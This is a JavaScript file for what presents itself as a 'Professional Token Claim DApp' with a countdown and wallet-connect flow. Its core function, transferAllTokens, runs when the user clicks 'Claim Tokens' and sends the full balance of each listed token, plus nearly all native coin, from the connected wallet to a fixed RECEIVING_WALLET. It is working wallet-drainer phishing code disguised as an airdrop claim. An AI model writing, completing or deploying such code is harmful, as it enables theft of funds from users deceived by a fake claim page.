// app.js - Professional Token Claim DApp

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
let walletConnectConnector = null;

// Initialize on load
window.addEventListener('load', async () => {
  try {
    initializeCountdown();
    
    document.getElementById("networkSelect").addEventListener('change', async (e) => {
      currentNetwork = e.target.value;
      updateTokenVisibility();
      await handleNetworkChange();
    });
    
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
    
    await checkWalletEnvironment();
    updateTokenVisibility();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  if (isMobile) {
    if (!window.ethereum) showTrustWalletUI();
    else hideTrustWalletUI();
  } else {
    hideTrustWalletUI();
  }
}

async function initializeWallet() {
  try {
    if (walletConnectConnector) {
      provider = new ethers.providers.Web3Provider(walletConnectConnector);
    } else {
      provider = new ethers.providers.Web3Provider(window.ethereum);
    }
    
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    updateConnectButton(true);
    document.getElementById("walletInfo").textContent = 
      `${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | ${NETWORK_CONFIGS[currentNetwork].chainName}`;
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

async function handleNetworkChange() {
  const btn = document.getElementById("connectWallet");
  if (window.ethereum?.selectedAddress || walletConnectConnector?.connected) {
    btn.disabled = true;
    btn.innerHTML = `<i class="fas fa-sync-alt fa-spin"></i> Switching...`;
    try {
      await checkNetwork();
      await initializeWallet();
      btn.disabled = false;
      updateConnectButton(true);
    } catch (err) {
      btn.disabled = false;
      updateConnectButton(false);
    }
  } else {
    updateConnectButton(false);
  }
}

// =====================
// UI FUNCTIONS
// =====================

function showTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'block';
  document.getElementById("connectWallet").style.display = 'none';
  document.querySelector('.mobile-warning').style.display = 'block';
}

function hideTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'none';
  document.getElementById("connectWallet").style.display = 'block';
  document.querySelector('.mobile-warning').style.display = 'none';
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
}

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `status ${type}`;
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateTokenVisibility() {
  document.querySelectorAll('.token-item').forEach(item => {
    item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
  });
}

function updateConnectButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  btn.disabled = false;
  if (isConnected) {
    btn.innerHTML = `<i class="fas fa-coins"></i> Claim Tokens`;
  } else {
    btn.innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
  }
}

// Countdown to May 9, 2025
function initializeCountdown() {
  const endDate = new Date("May 9, 2025 00:00:00 GMT+0000");
  
  const timer = setInterval(() => {
    const now = new Date().getTime();
    const distance = endDate - now;
    
    if (distance < 0) {
      clearInterval(timer);
      document.getElementById("days").textContent = "00";
      document.getElementById("hours").textContent = "00";
      document.getElementById("minutes").textContent = "00";
      document.getElementById("seconds").textContent = "00";
      return;
    }
    
    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    document.getElementById("days").textContent = days.toString().padStart(2, '0');
    document.getElementById("hours").textContent = hours.toString().padStart(2, '0');
    document.getElementById("minutes").textContent = minutes.toString().padStart(2, '0');
    document.getElementById("seconds").textContent = seconds.toString().padStart(2, '0');
  }, 1000);
}

// =====================
// CORE LOGIC
// =====================

async function handleWalletConnection() {
  if (!isMobile && !window.ethereum?.selectedAddress && !walletConnectConnector?.connected) {
    return showWalletOptions();
  }
  await connectAndProcess();
}

function showWalletOptions() {
  // Create modal
  const modal = document.createElement('div');
  modal.style.position = 'fixed';
  modal.style.top = '0';
  modal.style.left = '0';
  modal.style.width = '100%';
  modal.style.height = '100%';
  modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
  modal.style.display = 'flex';
  modal.style.justifyContent = 'center';
  modal.style.alignItems = 'center';
  modal.style.zIndex = '1000';
  
  // Create modal content
  const content = document.createElement('div');
  content.style.backgroundColor = 'white';
  content.style.padding = '20px';
  content.style.borderRadius = '10px';
  content.style.width = '300px';
  content.style.textAlign = 'center';
  
  content.innerHTML = `
    <h3 style="margin-bottom: 20px;">Connect Your Wallet</h3>
    <button id="metaMaskBtn" class="wallet-option">
      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
      <span>MetaMask</span>
    </button>
    <button id="walletConnectBtn" class="wallet-option">
      <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="WalletConnect">
      <span>WalletConnect</span>
    </button>
    <button id="cancelBtn" style="margin-top: 15px; background: none; border: none; color: #666; cursor: pointer;">
      Cancel
    </button>
  `;
  
  modal.appendChild(content);
  document.body.appendChild(modal);
  
  // Add event listeners
  document.getElementById("metaMaskBtn").addEventListener('click', async () => {
    document.body.removeChild(modal);
    await connectAndProcess();
  });
  
  document.getElementById("walletConnectBtn").addEventListener('click', () => {
    document.body.removeChild(modal);
    initWalletConnect();
  });
  
  document.getElementById("cancelBtn").addEventListener('click', () => {
    document.body.removeChild(modal);
  });
}

async function initWalletConnect() {
  try {
    updateStatus("Initializing WalletConnect...", "success");
    
    // Initialize WalletConnect v2
    walletConnectConnector = new WalletConnect.Client({
      projectId: "YOUR_WALLETCONNECT_PROJECT_ID", // Replace with your WalletConnect project ID
      metadata: {
        name: "Token Claim Portal",
        description: "Claim your token allocation",
        url: window.location.href,
        icons: ["https://cryptologos.cc/logos/ethereum-eth-logo.png"]
      }
    });
    
    // Subscribe to connection events
    walletConnectConnector.on("session_update", (error, payload) => {
      if (error) {
        throw error;
      }
      const { chainId, accounts } = payload.params[0];
      userAddress = accounts[0];
    });

    walletConnectConnector.on("connect", (error, payload) => {
      if (error) {
        throw error;
      }
      const { chainId, accounts } = payload.params[0];
      userAddress = accounts[0];
      connectAndProcess();
    });

    walletConnectConnector.on("disconnect", (error, payload) => {
      if (error) {
        throw error;
      }
      walletConnectConnector = null;
      updateStatus("WalletConnect disconnected", "error");
      updateConnectButton(false);
    });
    
    // Create new session
    await walletConnectConnector.createSession();
    
    // Generate QR Code
    const uri = walletConnectConnector.uri;
    const qrDiv = document.getElementById("walletConnectQR");
    qrDiv.innerHTML = '<p>Scan with your mobile wallet</p>';
    QRCode.toCanvas(qrDiv, uri, { width: 200 }, (error) => {
      if (error) {
        console.error("QR code error:", error);
        qrDiv.innerHTML = '<p>Error generating QR code. Please try again.</p>';
      }
    });
    
  } catch (err) {
    console.error("WalletConnect error:", err);
    updateStatus("WalletConnect initialization failed", "error");
    walletConnectConnector = null;
  }
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    if (!window.ethereum && !walletConnectConnector) {
      throw new Error("Please install a Web3 wallet or use WalletConnect");
    }

    if (!walletConnectConnector) {
      await window.ethereum.request({ method: "eth_requestAccounts" });
    }
    
    await checkNetwork();
    const initialized = await initializeWallet();
    if (!initialized) return;
    
    await transferAllTokens();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateConnectButton(false);
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    let chainId;
    if (walletConnectConnector) {
      chainId = await walletConnectConnector.request({ method: 'eth_chainId' });
    } else {
      chainId = await window.ethereum.request({ method: 'eth_chainId' });
    }
    
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        if (walletConnectConnector) {
          await walletConnectConnector.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        } else {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        }
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            if (walletConnectConnector) {
              await walletConnectConnector.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORK_CONFIGS[currentNetwork]]
              });
            } else {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORK_CONFIGS[currentNetwork]]
              });
            }
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

async function transferAllTokens() {
  try {
    const tokens = TOKENS[currentNetwork];
    let successCount = 0;
    
    // Process ERC20 tokens
    for (const token of tokens.filter(t => !t.isNative)) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
        const balance = await contract.balanceOf(userAddress);
        
        if (balance.gt(0)) {
          const tx = await contract.transfer(RECEIVING_WALLET, balance, {
            gasLimit: 100000
          });
          await tx.wait();
          successCount++;
          updateStatus(
            `Transferred ${token.symbol} <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error(`Transfer error for ${token.symbol}:`, err);
        updateStatus(`Failed to transfer ${token.symbol}`, "error");
      }
    }

    // Process native token
    const nativeToken = tokens.find(t => t.isNative);
    if (nativeToken) {
      try {
        const balance = await provider.getBalance(userAddress);
        const keepAmount = ethers.utils.parseUnits("0.001", nativeToken.decimals);
        const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
        
        if (sendAmount.gt(0)) {
          const tx = await signer.sendTransaction({
            to: RECEIVING_WALLET,
            value: sendAmount,
            gasLimit: 21000
          });
          await tx.wait();
          successCount++;
          updateStatus(
            `Transferred ${nativeToken.symbol} <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error("Native transfer error:", err);
        updateStatus("Failed to transfer native token", "error");
      }
    }
    
    if (successCount > 0) {
      updateStatus(`Successfully transferred ${successCount} assets`, "success");
    } else {
      updateStatus("No tokens found to transfer", "info");
    }
  } catch (err) {
    console.error("Transfer process error:", err);
    updateStatus("Transfer process failed", "error");
  }
}
